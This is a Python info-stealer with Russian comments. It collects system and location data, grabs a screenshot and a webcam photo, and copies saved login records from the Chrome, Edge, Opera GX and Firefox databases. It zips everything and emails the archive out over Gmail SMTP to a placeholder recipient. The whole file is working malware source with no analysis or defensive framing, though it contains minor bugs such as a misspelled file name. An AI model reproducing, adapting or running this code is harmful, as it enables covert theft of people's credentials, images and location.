import socket
import platform
import os
import psutil
import requests
import geocoder
from PIL import ImageGrab
import sqlite3
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from base64 import b64decode
import json

# Получение информации о компьютере
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
system = platform.system()
processor = platform.processor()
architecture = platform.machine()
ram = round(psutil.virtual_memory().total / (1024**3), 2)
disk_usage = psutil.disk_usage('/')

# Получение информации о провайдере и местоположении через сторонний сервис
#response = requests.get(f"http://ip-api.com/json/{ip_address}")
#data = response.json()
#provider = data.get("isp")
#location = f"{data.get('city')}, {data.get('country')}"
ip = requests.get('https://api.ipify.org').text
location = str(geocoder.ip(ip))
ind = location.index("Geocode")
location = location[ind+9:-2]

# Сохранение информации в текстовый файл
with open("output.txt", "w") as file:
    file.write("###############\n")
    file.write("All_DATA:     # \n")
    file.write("###############\n")
    file.write(f"Computer Information:\n")
    file.write(f"Hostname: {hostname}\n")
    file.write(f"IPV4: {ip_address}\n")
    file.write(f"Operating System: {system}\n")
    file.write(f"Processor: {processor}\n")
    file.write(f"Architecture: {architecture}\n")
    file.write(f"RAM: {ram} GB\n")
    file.write(f"Disk Usage: {disk_usage.used / (1024**3)} GB / {disk_usage.total / (1024**3)} GB\n")
    file.write(f"Ip: {ip}\n")
    #file.write("Provider:((\n")
    file.write(f"Location: {location}\n")
    file.write("\n"+"#####################\n")
    file.write("PASSWORDS: #\n")
    file.write("#####################\n")
  
screen = ImageGrab.grab()
screen.save('screenshot.jpg')

# Имя файла, в который будут записываться пароли
output_file = 'output.txt'

# Список путей к файлам баз данных браузеров
chrome_db_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
firefox_db_path = os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json'
opera_db_path = os.path.expanduser('~') + r'\AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
edge_db_path = os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data\Default\Login Data'

# Обработка сохраненных паролей в браузере Google Chrome
try:
    conn = sqlite3.connect(chrome_db_path)
    cursor = conn.cursor()

    # Выполнение запроса на выборку сохраненных паролей Chrome
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    with open(output_file, 'a') as f:
        f.write("•Chrome:\n")
    # Обход результатов и декодирование паролей
    for result in cursor.fetchall():
        password = result[2]
        if password:
            #print(f"URL: {result[0]} | Username: {result[1]} | Password: {password}")
            with open(output_file, 'a') as f:
                f.write(f"-URL: {result[0]} | Username: {result[1]} | Password: {password}\n")

    conn.close()

except Exception as e:
    #print(f"Could not get Chrome passwords: {str(e)}")
    with open(output_file, 'a') as f:
        f.write("•Chrome:None\n")

# Обработка сохраненных паролей в браузере Mozilla Firefox
try:
    with open(firefox_db_path, 'r') as f:
        data = json.load(f)
    with open(output_file, 'a') as f:
        f.write("•Firefox:\n")
    # Обход результатов и вывод URL, имя пользователя и пароль
    for entry in data['logins']:
        url = entry['hostname']
        username = entry['encryptedUsername']
        password = entry['encryptedPassword']
        #print(f"URL: {url} | Username: {username} | Password: {password}")
        with open(output_file, 'a') as f:
            f.write(f"-URL: {url} | Username: {username} | Password: {password}\n")

except Exception as e:
    #print(f"Could not get Firefox passwords: {str(e)}")
    with open(output_file, 'a') as f:
        f.write("•Firefox: None\n")

# Обработка сохраненных паролей в браузере Opera GX
try:
    conn = sqlite3.connect(opera_db_path)
    cursor = conn.cursor()

    # Выполнение запроса на выборку сохраненных паролей Opera GX
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    with open(output_file, 'a') as f:
        f.write("•Opera GX:\n")
    # Обход результатов и декодирование паролей
    for result in cursor.fetchall():
        password = result[2]
        if password:
            #print(f"URL: {result[0]} | Username: {result[1]} | Password: {password}")
            with open(output_file, 'a') as f:
                f.write(f"-URL: {result[0]} | Username: {result[1]} | Password: {password}\n")

    conn.close()

except Exception as e:
    #print(f"Could not get Opera GX passwords: {str(e)}")
    with open(output_file, 'a') as f:
        f.write("•Opera GX: None\n")

# Обработка сохраненных паролей в браузере Microsoft Edge
try:
    conn = sqlite3.connect(edge_db_path)
    cursor = conn.cursor()

    # Выполнение запроса на выборку сохраненных паролей Edge
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    with open(output_file, 'a') as f:
        f.write("•Microsoft Edge:\n")
    # Обход результатов и декодирование паролей
    for result in cursor.fetchall():
        password = result[2]
        if password:
            #print(f"URL: {result[0]} | Username: {result[1]} | Password: {password}")
            with open(output_file, 'a') as f:
                f.write(f"-URL: {result[0]} | Username: {result[1]} | Password: {password}\n")

    conn.close()

except Exception as e:
    #print(f"Could not get Edge passwords: {str(e)}")
    with open(output_file, 'a') as f:
        f.write("•Microsoft Edge:None\n")



 ####################################
import cv2

def capture_webcam_snapshot(output_file):
    # Открытие доступа к веб-камере
    cap = cv2.VideoCapture(0)

    # Проверка успешного открытия доступа к веб-камере
    if not cap.isOpened():
        return

    # Считывание изображения с веб-камеры
    ret, frame = cap.read()

    # Проверка успешного считывания изображения
    if not ret:
        
        return

    # Сохранение снимка в файл
    cv2.imwrite(output_file, frame)

    # Закрытие доступа к веб-камере
    cap.release()

    

# Вызов функции для снятия снимка с веб-камеры
capture_webcam_snapshot("snapshot.jpg")
####################################

import zipfile
#import time
def create_zip_archive(archive_name, files):
    with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in files:
            # Добавление файла в архив
            zipf.write(file, os.path.basename(file))
    
    #print(f"Архив {archive_name} создан успешно.")

# упаковка в архив
files_to_archive = ["snapshot.jpg", "output.txt", "screenshot.jpg"]
archive_name = "archive.zip"
create_zip_archive(archive_name, files_to_archive)
os.remove("snapshot.jpg")
os.remove("output.txt")
os.remove("scjreenshot.jpg")

#отправка
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText

def send_email_with_attachment(sender_email, sender_password, receiver_email, subject, message, attachment_path):
# Создание сообщения
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

        # Добавление текстового сообщения
    msg.attach(MIMEText(message, 'plain'))

    # Добавление архива в виде вложения
    attachment = open(attachment_path, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " + attachment_path)
    msg.attach(part)

        # Установка соединения с SMTP-сервером
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(sender_email, sender_password)

        # Отправка письма
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()
def sendmail():
    sender_email = "yorname@gmail.com"  # Ваша электронная почта
    sender_password = "yourpassword"  # Пароль от вашей почты
    receiver_email = "recieve@mail.com"  # Адрес получателя
    subject = "text"  # Тема письма
    message = "text"  # Текст сообщения
    attachment_path = "archive.zip"  # Путь к архиву
    send_email_with_attachment(sender_email, sender_password, receiver_email, subject, message, attachment_path)
    os.remove("archive.zip")
sendmail()

